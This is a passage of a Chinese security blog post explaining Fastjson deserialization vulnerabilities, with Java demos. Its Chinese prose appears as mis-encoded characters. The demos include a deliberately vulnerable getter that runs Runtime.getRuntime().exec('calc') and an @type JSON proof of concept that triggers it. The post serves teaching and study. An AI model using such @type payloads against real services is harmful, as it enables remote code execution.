function_">getProperties</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getProperties&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> properties;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ååºåˆ—åŒ–StudentUnserializeæ–‡ä»¶ï¼Œå…ˆæ˜¯é»˜è®¤è°ƒç”¨parseObject()ä¸å¸¦æŒ‡å®šç±»å‹çš„å‚æ•°ï¼šä¹Ÿå°±æ˜¯åªæœ‰ <code>JSON.parseObject(jsonstring)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentUnserialize2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;name\&quot;:\&quot;Drunkbaby\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString);  </span><br><span class="line">        <span class="comment">// æˆ–ä»¥ä¸‹è¯­å¥ï¼Œè¾“å‡ºç»“æœä¸€è‡´  </span></span><br><span class="line">        <span class="comment">//JSONObject obj = JSON.parseObject(jsonString);  </span></span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºçœ‹åˆ°ï¼Œè°ƒç”¨äº†Studentç±»çš„æ„é€ å‡½æ•°ã€æ‰€æœ‰å±æ€§çš„getteræ–¹æ³•ã€JSONé‡Œé¢éç§æœ‰å±æ€§çš„setteræ–¹æ³•ï¼Œå…¶ä¸­getProperties()è°ƒç”¨äº†ä¸¤æ¬¡ï¼›æ— è®ºå®šä¹‰çš„å¯¹è±¡æ˜¯Objectè¿˜æ˜¯JSONObjectï¼Œæœ€åååºåˆ—åŒ–å¾—åˆ°çš„éƒ½æ˜¯JSONObjectç±»å¯¹è±¡ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯æœªååºåˆ—åŒ–æˆåŠŸçš„ï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308082234896.png" alt="image-20230808223413064"><br>æ¥ç€åœ¨StudentUnserialize2.javaä¸­ä¿®æ”¹ååºåˆ—åŒ–ä»£ç è¯­å¥å¦‚ä¸‹ï¼ŒåŠ ä¸ŠæŒ‡å®šååºåˆ—åŒ–å¾—åˆ°çš„ç±»å‹ä¸ºObject.classæˆ–Student.classï¼Œè¿™æ ·å°±æ˜¯æˆåŠŸååºåˆ—åŒ–çš„å›æ˜¾ã€‚<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091125832.png" alt="image-20230809112543959"></p><h3 id="3-parseä¸parseObjectåŒºåˆ«"><a href="#3-parseä¸parseObjectåŒºåˆ«" class="headerlink" title="3. parseä¸parseObjectåŒºåˆ«"></a>3. parseä¸parseObjectåŒºåˆ«</h3><p>å‰é¢çš„demoéƒ½æ˜¯ç”¨<code>parseObject()</code>æ¼”ç¤ºçš„ï¼Œè¿˜æ²¡è¯´åˆ°<code>parse()</code>ã€‚ä¸¤è€…ä¸»è¦çš„åŒºåˆ«å°±æ˜¯<code>parseObject()</code>è¿”å›çš„æ˜¯JSONObjectè€Œ<code>parse()</code>è¿”å›çš„æ˜¯å®é™…ç±»å‹çš„å¯¹è±¡ï¼Œå½“åœ¨æ²¡æœ‰å¯¹åº”ç±»çš„å®šä¹‰çš„æƒ…å†µä¸‹ï¼Œä¸€èˆ¬æƒ…å†µä¸‹éƒ½ä¼šä½¿ç”¨<code>JSON.parseObject()</code>æ¥è·å–æ•°æ®ã€‚</p><blockquote><p>FastJsonä¸­çš„ <code>parse()</code> å’Œ <code>parseObject()</code> æ–¹æ³•éƒ½å¯ä»¥ç”¨æ¥å°†JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–æˆJavaå¯¹è±¡ï¼Œ<code>parseObject()</code> æœ¬è´¨ä¸Šä¹Ÿæ˜¯è°ƒç”¨ <code>parse()</code> è¿›è¡Œååºåˆ—åŒ–çš„ã€‚ä½†æ˜¯ <code>parseObject()</code> ä¼šé¢å¤–çš„å°†Javaå¯¹è±¡è½¬ä¸º JSONObjectå¯¹è±¡ï¼Œå³ <code>JSON.toJSON()</code>ã€‚æ‰€ä»¥è¿›è¡Œååºåˆ—åŒ–æ—¶çš„ç»†èŠ‚åŒºåˆ«åœ¨äºï¼Œ<code>parse()</code> ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ <code>setter</code> æ–¹æ³•åŠæŸäº›ç‰¹å®šæ¡ä»¶çš„ <code>getter</code> æ–¹æ³•ï¼Œè€Œ <code>parseObject()</code> ç”±äºå¤šæ‰§è¡Œäº† <code>JSON.toJSON(obj)</code>ï¼Œæ‰€ä»¥åœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ååºåˆ—åŒ–ç›®æ ‡ç±»çš„æ‰€æœ‰ <code>setter</code> å’Œ <code>getter</code> æ–¹æ³•ã€‚</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ç”¨<code>parse()</code>ååºåˆ—åŒ–ä¼šç›´æ¥å¾—åˆ°ç‰¹å®šçš„ç±»ï¼Œè€Œæ— éœ€åƒ<code>parseObject()</code>ä¸€æ ·è¿”å›çš„æ˜¯JSONObjectç±»å‹çš„å¯¹è±¡ã€è¿˜å¯èƒ½éœ€è¦å»è®¾ç½®ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šè¿”å›ç‰¹å®šçš„ç±»ã€‚</p><p>ä¿®æ”¹ååºåˆ—åŒ–è¯­å¥ä¸­çš„<code>parseObject()</code>ä¸º<code>parse()</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentUnserialize3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;name\&quot;:\&quot;y0n3er\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(jsonString, Feature.SupportNonPublicField);  </span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091126302.png" alt="image-20230809112621604"></p><h3 id="4-ç®€å•æ€»ç»“"><a href="#4-ç®€å•æ€»ç»“" class="headerlink" title="4. ç®€å•æ€»ç»“"></a>4. ç®€å•æ€»ç»“</h3><p>ç®€å•æ€»ç»“ä¸Šé¢çš„å°±æ˜¯ååºåˆ—åŒ–çš„è¯­å¥åº”è¯¥è¿™ä¹ˆå†™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:6,&quot;</span> +  </span><br><span class="line">        <span class="string">&quot;\&quot;name\&quot;:\&quot;y0n3er\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString, Student.class);</span><br></pre></td></tr></table></figure><p>è¦ç”¨ <code>parseObject</code>ï¼Œé‡Œé¢çš„å‚æ•°éœ€è¦æ˜¯ <code>Object.class</code></p><h2 id="fastjson-ååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#fastjson-ååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="fastjson ååºåˆ—åŒ–æ¼æ´åŸç†"></a>fastjson ååºåˆ—åŒ–æ¼æ´åŸç†</h2><p>è¿™é‡Œè¿˜æ˜¯ä¸Šé¢çš„é‚£ä¸ªæ€»ç»“ï¼Œæˆ‘ç”¨@typeç»™ä½ æŒ‡å®šä½ åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨å“ªä¸ªç±»ä¸‹çš„ <code>setter</code> ä¸ <code>getter</code> æ–¹æ³•ï¼Œå½“ç„¶è¿™é‡Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„ <code>setter</code> å’Œ <code>getter</code> æ–¹æ³•ã€‚<br><strong>ä¸‹é¢ç›´æ¥å¼•ç”¨ç»“è®ºï¼ŒFastjsonä¼šå¯¹æ»¡è¶³ä¸‹åˆ—è¦æ±‚çš„setter&#x2F;getteræ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼š</strong><br>æ»¡è¶³æ¡ä»¶çš„setterï¼š</p><ul><li>éé™æ€å‡½æ•°</li><li>è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±»</li><li>å‚æ•°ä¸ªæ•°ä¸º1ä¸ª</li></ul><p>æ»¡è¶³æ¡ä»¶çš„getterï¼š</p><ul><li>éé™æ€æ–¹æ³•</li><li>æ— å‚æ•°</li><li><strong>è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollectionæˆ–Mapæˆ–AtomicBooleanæˆ–AtomicIntegeræˆ–AtomicLong</strong></li></ul><p>å‰é¢çš„propertiesç§æœ‰å±æ€§ï¼Œå…¶ç±»å‹ä¸ºPropertiesï¼Œè€ŒPropertiesæ˜¯ç»§æ‰¿äºHashtableï¼ŒHashtableæ˜¯å®ç°Mapæ¥å£ç±»çš„ç±»ï¼Œå› æ­¤propertiesç§æœ‰å±æ€§çš„<code>getter</code>æ–¹æ³•æ˜¯ç»§æ‰¿è‡ªMapï¼Œä»è€Œèƒ½å¤ŸæˆåŠŸè¢«Fastjsonè°ƒç”¨ã€‚</p><h3 id="1-æ¼æ´åŸç†"><a href="#1-æ¼æ´åŸç†" class="headerlink" title="1. æ¼æ´åŸç†"></a>1. æ¼æ´åŸç†</h3><p>ç”±å‰é¢çŸ¥é“ï¼ŒFastjsonæ˜¯è‡ªå·±å®ç°çš„ä¸€å¥—åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ï¼Œä¸æ˜¯ç”¨çš„JavaåŸç”Ÿçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ã€‚æ— è®ºæ˜¯å“ªä¸ªç‰ˆæœ¬ï¼ŒFastjsonååºåˆ—åŒ–æ¼æ´çš„åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡ä¸åŒç‰ˆæœ¬æ˜¯é’ˆå¯¹ä¸åŒçš„é»‘åå•æˆ–è€…åˆ©ç”¨ä¸åŒåˆ©ç”¨é“¾æ¥è¿›è¡Œç»•è¿‡åˆ©ç”¨è€Œå·²ã€‚</p><p>é€šè¿‡Fastjsonååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä¼ å…¥ä¸€ä¸ªæ¶æ„æ„é€ çš„JSONå†…å®¹ï¼Œç¨‹åºå¯¹å…¶è¿›è¡Œååºåˆ—åŒ–åå¾—åˆ°æ¶æ„ç±»å¹¶æ‰§è¡Œäº†æ¶æ„ç±»ä¸­çš„æ¶æ„å‡½æ•°ï¼Œè¿›è€Œå¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p><h4 id="é‚£ä¹ˆå¦‚ä½•æ‰èƒ½å¤Ÿååºåˆ—åŒ–å‡ºæ¶æ„ç±»å‘¢ï¼Ÿ"><a href="#é‚£ä¹ˆå¦‚ä½•æ‰èƒ½å¤Ÿååºåˆ—åŒ–å‡ºæ¶æ„ç±»å‘¢ï¼Ÿ" class="headerlink" title="é‚£ä¹ˆå¦‚ä½•æ‰èƒ½å¤Ÿååºåˆ—åŒ–å‡ºæ¶æ„ç±»å‘¢ï¼Ÿ"></a>é‚£ä¹ˆå¦‚ä½•æ‰èƒ½å¤Ÿååºåˆ—åŒ–å‡ºæ¶æ„ç±»å‘¢ï¼Ÿ</h4><p>ç”±å‰é¢demoçŸ¥é“ï¼ŒFastjsonä½¿ç”¨<code>parseObject()</code>&#x2F;<code>parse()</code>è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å¯ä»¥æŒ‡å®šç±»å‹ã€‚å¦‚æœæŒ‡å®šçš„ç±»å‹å¤ªå¤§ï¼ŒåŒ…å«å¤ªå¤šå­ç±»ï¼Œå°±æœ‰åˆ©ç”¨ç©ºé—´äº†ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæŒ‡å®šç±»å‹ä¸ºObjectæˆ–JSONObjectï¼Œåˆ™å¯ä»¥ååºåˆ—åŒ–å‡ºæ¥ä»»æ„ç±»ã€‚ä¾‹å¦‚ä»£ç å†™<code>Object o = JSON.parseObject(poc,Object.class)</code>å°±å¯ä»¥ååºåˆ—åŒ–å‡ºObjectç±»æˆ–å…¶ä»»æ„å­ç±»ï¼Œè€ŒObjectåˆæ˜¯ä»»æ„ç±»çš„çˆ¶ç±»ï¼Œæ‰€ä»¥å°±å¯ä»¥ååºåˆ—åŒ–å‡ºæ‰€æœ‰ç±»ã€‚</p><h4 id="æ¥ç€ï¼Œå¦‚ä½•æ‰èƒ½è§¦å‘ååºåˆ—åŒ–å¾—åˆ°çš„æ¶æ„ç±»ä¸­çš„æ¶æ„å‡½æ•°å‘¢ï¼Ÿ"><a href="#æ¥ç€ï¼Œå¦‚ä½•æ‰èƒ½è§¦å‘ååºåˆ—åŒ–å¾—åˆ°çš„æ¶æ„ç±»ä¸­çš„æ¶æ„å‡½æ•°å‘¢ï¼Ÿ" class="headerlink" title="æ¥ç€ï¼Œå¦‚ä½•æ‰èƒ½è§¦å‘ååºåˆ—åŒ–å¾—åˆ°çš„æ¶æ„ç±»ä¸­çš„æ¶æ„å‡½æ•°å‘¢ï¼Ÿ"></a>æ¥ç€ï¼Œå¦‚ä½•æ‰èƒ½è§¦å‘ååºåˆ—åŒ–å¾—åˆ°çš„æ¶æ„ç±»ä¸­çš„æ¶æ„å‡½æ•°å‘¢ï¼Ÿ</h4><p>ç”±å‰é¢çŸ¥é“ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–æ—¶ä¼šå°†ååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€<code>getter</code>æ–¹æ³•ã€<code>setter</code>æ–¹æ³•æ‰§è¡Œä¸€éï¼Œå¦‚æœè¿™ä¸‰ç§æ–¹æ³•ä¸­å­˜åœ¨å±é™©æ“ä½œï¼Œåˆ™å¯èƒ½å¯¼è‡´ååºåˆ—åŒ–æ¼æ´çš„å­˜åœ¨ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯æ”»å‡»è€…ä¼ å…¥è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»ä¸­çš„æ„é€ å‡½æ•°ã€<code>getter</code>æ–¹æ³•ã€<code>setter</code>æ–¹æ³•ä¸­è¦å­˜åœ¨æ¼æ´æ‰èƒ½è§¦å‘ã€‚</p><p>æˆ‘ä»¬åˆ°<code>DefaultJSONParser.parseObject(Map object, Object fieldName)</code>ä¸­çœ‹ä¸‹ï¼ŒJSONä¸­ä»¥@typeå½¢å¼ä¼ å…¥çš„ç±»çš„æ—¶å€™ï¼Œè°ƒç”¨<code>deserializer.deserialize()</code>å¤„ç†è¯¥ç±»ï¼Œå¹¶å»è°ƒç”¨è¿™ä¸ªç±»çš„<code>setter</code>å’Œ<code>getter</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// JSON.DEFAULT_TYPE_KEYå³@type</span></span><br><span class="line">    <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line">        <span class="keyword">return</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure><p>æ•´ä¸ªè§£æè¿‡ç¨‹ç›¸å½“å¤æ‚ï¼ŒçŸ¥é“ç»“è®ºå°±okäº†ã€‚</p><h4 id="å°ç»“ä¸€ä¸‹"><a href="#å°ç»“ä¸€ä¸‹" class="headerlink" title="å°ç»“ä¸€ä¸‹"></a>å°ç»“ä¸€ä¸‹</h4><p>è‹¥ååºåˆ—åŒ–æŒ‡å®šç±»å‹çš„ç±»å¦‚<code>Student obj = JSON.parseObject(text, Student.class);</code>ï¼Œè¯¥ç±»æœ¬èº«çš„æ„é€ å‡½æ•°ã€<code>setter</code>æ–¹æ³•ã€<code>getter</code>æ–¹æ³•å­˜åœ¨å±é™©æ“ä½œï¼Œåˆ™å­˜åœ¨Fastjsonååºåˆ—åŒ–æ¼æ´ï¼›</p><p>è‹¥ååºåˆ—åŒ–æœªæŒ‡å®šç±»å‹çš„ç±»å¦‚<code>Object obj = JSON.parseObject(text, Object.class);</code>ï¼Œè¯¥è‹¥è¯¥ç±»çš„å­ç±»çš„æ„é€ æ–¹æ³•ã€<code>setter</code>æ–¹æ³•ã€<code>getter</code>æ–¹æ³•å­˜åœ¨å±é™©æ“ä½œï¼Œåˆ™å­˜åœ¨Fastjsonååºåˆ—åŒ–æ¼æ´ï¼›</p><h3 id="2-PoC-å†™æ³•"><a href="#2-PoC-å†™æ³•" class="headerlink" title="2. PoC å†™æ³•"></a>2. PoC å†™æ³•</h3><p>ä¸€èˆ¬çš„ï¼ŒFastjsonååºåˆ—åŒ–æ¼æ´çš„PoCå†™æ³•å¦‚ä¸‹ï¼Œ@typeæŒ‡å®šäº†ååºåˆ—åŒ–çš„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;xxx.xxx.xxx&quot;</span>,</span><br><span class="line"><span class="string">&quot;xxx&quot;</span>:<span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®æ˜¯è¦æ‰¾å‡ºä¸€ä¸ªç‰¹æ®Šçš„åœ¨ç›®æ ‡ç¯å¢ƒä¸­å·²å­˜åœ¨çš„ç±»ï¼Œæ»¡è¶³å¦‚ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ol><li>è¯¥ç±»çš„æ„é€ å‡½æ•°ã€<code>setter</code>æ–¹æ³•ã€<code>getter</code>æ–¹æ³•ä¸­çš„æŸä¸€ä¸ªå­˜åœ¨å±é™©æ“ä½œï¼Œæ¯”å¦‚é€ æˆå‘½ä»¤æ‰§è¡Œï¼›</li><li>å¯ä»¥æ§åˆ¶è¯¥æ¼æ´å‡½æ•°çš„å˜é‡ï¼ˆä¸€èˆ¬å°±æ˜¯è¯¥ç±»çš„å±æ€§ï¼‰ï¼›</li></ol><h3 id="3-æ¼æ´Demo"><a href="#3-æ¼æ´Demo" class="headerlink" title="3. æ¼æ´Demo"></a>3. æ¼æ´Demo</h3><p>ç”±å‰é¢æ¯”è¾ƒçš„æ¡ˆä¾‹çŸ¥é“ï¼Œå½“ååºåˆ—åŒ–æŒ‡å®šçš„ç±»å‹æ˜¯Object.classï¼Œå³ä»£ç ä¸º<code>Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</code>æ—¶ï¼Œååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€æ‰€æœ‰å±æ€§çš„<code>setter</code>æ–¹æ³•ã€propertiesç§æœ‰å±æ€§çš„<code>getter</code>æ–¹æ³•éƒ½ä¼šè¢«è°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬è¿™é‡Œç›´æ¥åšæœ€ç®€å•çš„ä¿®æ”¹ï¼Œå°†Studentç±»ä¸­ä¼šè¢«è°ƒç”¨çš„<code>getter</code>æ–¹æ³•æ·»åŠ æ¼æ´ä»£ç ï¼Œè¿™é‡Œä¿®æ”¹<code>getProperties()</code>ä½œä¸ºæ¼”ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">private</span> String address;  </span><br><span class="line">    <span class="keyword">private</span> Properties properties;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;æ„é€ å‡½æ•°&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAddress&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> address;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getProperties&quot;</span>);  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> properties;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè¿™é‡Œç›´æ¥æ–°å»ºä¸€ä¸ªååºåˆ—çš„ä»£ç ç”¨æ¥è§¦å‘æ¼æ´</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonEasyPoC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;y0n3er\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString, Object.class);  </span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091126066.png" alt="image-20230809112658404"><br>å¾ˆæ˜æ˜¾ï¼Œå‰é¢çš„Demoä¸­ååºåˆ—åŒ–çš„ç±»æ˜¯ä¸€ä¸ªObjectç±»ï¼Œè¯¥ç±»æ˜¯ä»»æ„ç±»çš„çˆ¶ç±»ï¼Œå…¶å­ç±»Studentå­˜åœ¨Fastjsonååºåˆ—åŒ–æ¼æ´ï¼Œå½“@typeæŒ‡å‘Studentç±»æ˜¯ååºåˆ—åŒ–å°±ä¼šè§¦å‘æ¼æ´ã€‚</p><p>å¯¹äºå¦ä¸€ç§ååºåˆ—åŒ–æŒ‡å®šç±»çš„æƒ…æ™¯ï¼Œæ˜¯è¯¥æŒ‡å®šç±»æœ¬èº«å°±å­˜åœ¨æ¼æ´ï¼Œæ¯”å¦‚æˆ‘ä»¬å°†ä¸Šè¿°Demoä¸­ååºåˆ—åŒ–é‚£è¡Œä»£ç æ”¹æˆç›´æ¥ååºåˆ—åŒ–å¾—åˆ°Studentç±»è€ŒéObjectç±»ï¼Œè¿™æ ·å°±æ˜¯å¦ä¸€ä¸ªè§¦å‘ä¹Ÿæ˜¯æœ€ç›´æ¥çš„è§¦å‘åœºæ™¯ï¼š</p><figure class="highlight java"><table><tr><td 